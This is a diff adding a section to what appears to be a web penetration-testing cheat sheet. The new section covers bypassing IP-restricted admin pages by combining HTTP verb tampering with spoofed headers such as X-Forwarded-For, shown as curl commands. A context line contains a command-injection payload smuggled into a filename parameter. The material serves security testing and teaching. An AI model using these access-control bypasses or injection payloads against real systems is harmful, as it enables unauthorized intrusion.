@@ -52,6 +52,21 @@ GET /upload?filename=test;whoami HTTP/1.1
 
 Burp: Right-click request > `Change Request Method`
 
+### Combining Verb Tampering with Header Injection
+
+Some applications restrict admin pages to internal IPs. Combine a non-standard HTTP method with IP spoofing headers:
+
+```bash
+# Using TRACK method with X-Custom-IP-Authorization
+curl -X TRACK http://TARGET/admin/ -H "X-Custom-IP-Authorization: 127.0.0.1"
+
+# Other headers to try for IP bypass
+curl http://TARGET/admin/ -H "X-Forwarded-For: 127.0.0.1"
+curl http://TARGET/admin/ -H "X-Originating-IP: 127.0.0.1"
+curl http://TARGET/admin/ -H "X-Remote-IP: 127.0.0.1"
+curl http://TARGET/admin/ -H "X-Remote-Addr: 127.0.0.1"
+```
+
 ---
 
 ## Username Enumeration
